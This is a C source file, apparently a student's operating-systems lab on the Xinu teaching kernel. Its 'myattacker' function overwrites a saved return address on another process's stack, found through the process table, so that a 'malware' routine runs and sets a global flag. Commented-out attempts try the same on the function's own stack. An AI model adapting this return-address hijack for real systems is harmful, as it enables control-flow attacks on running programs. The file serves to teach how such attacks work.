/* myattacker.c - myattacker */

#include <xinu.h>
#include <stdio.h>

#define distToPros (3709948 * 4)

/*------------------------------------------------------------------------
 *  myattacker  -  a process created by main
 *
 *  FUCK THIS LAB!!! IT NEVER WORKS!!!
 *------------------------------------------------------------------------
 */

/*
// why we need to add 6 to the address of the malware code 
   (use &myattackermalware+6), I think

victim:
	push %ebp
	...
	call blahblah

	leave
	ret

myattackermalware:
	push %ebp
	...
	hack the global variable
	mov $1, myvictimglobal
*/

extern int myvictimglobal;
extern void myattackermalware(void);
extern syscall stacktrace(int);

// attacking the victim process through the process table
void myattacker() {
	// get process to attack
	struct procent *proc = &proctab[currpid - 1];
	int* vicBase = (int*)(proc->prstkbase);
	
	#ifdef VERBOSE
	kprintf("\nBase pointer of victim process: 0x%08X\n", vicBase);
	kprintf("\n&myattackermalware = 0x%08X\n", &myattackermalware + 6);
	#endif

	//vicBase -= 9;		// hack the return address of second()
	vicBase -= 17;		// hack the return address of sleepms
	*vicBase = (int)&myattackermalware + 6; // 6 is the magic number. Yay!!!

	#ifdef VERBOSE
	kprintf("\nAdjusted base pointer of victim process: 0x%08X\n\n", vicBase);
	#endif
}


/*
// hack my own stack as a proof of concept
void myattacker() {
	//sleepms(1000);
	int k = 5;
	k *= 4;

	int* pt = (int*)&k;
	pt += 4;

	stacktrace(currpid);

	*pt = (int)myattackermalware;

	kprintf("\nPID = %d\t\tpt = 0x%08X\t\t*pt = 0x%08X\n", currpid, pt, *pt);
	//printf("\nPID = %d\t\t&myattackermalware = 0x%06X\n",
	//	currpid, myattackermalware);

	sleepms(100);

}
*/

/*
extern unsigned long *esp;
extern unsigned long *ebp;

// this is me grasping at straws to hack my own stack
void myattacker() {
	unsigned long *top_esp, *top_ebp;
	asm("movl %esp, esp");
	asm("movl %ebp, ebp");
	top_ebp = ebp;
	top_esp = esp;

	top_ebp += 1;
	*top_ebp = myattackermalware;

	kprintf("\nPID = %d\t\t&myattackermalware = 0x%06X\n", currpid, &myattackermalware);
	sleepms(50);

	stacktrace(currpid);
}
*/

/*
extern unsigned long *esp;
extern unsigned long *ebp;

// cooperative attempt by me and a TA to determine if stacktrace() worked properly
void myattacker() {
	struct procent *proc = &proctab[currpid];
	unsigned long *top_esp, *top_ebp;
	char *base = proc->prstkbase;
	int k = 5;
	k *= 4;
	int* pt = (int*)&k;
	pt += 4;
	*pt = myattackermalware;

	stacktrace(currpid);

	asm("movl %esp, esp");
	asm("movl %ebp, ebp");
	top_ebp = ebp;
	top_esp = esp;

	while (top_ebp > top_esp) {
		kprintf("0x%x %x (%d)\n\r", top_ebp, *top_ebp, *top_ebp);
		--top_ebp;
	}
}
*/

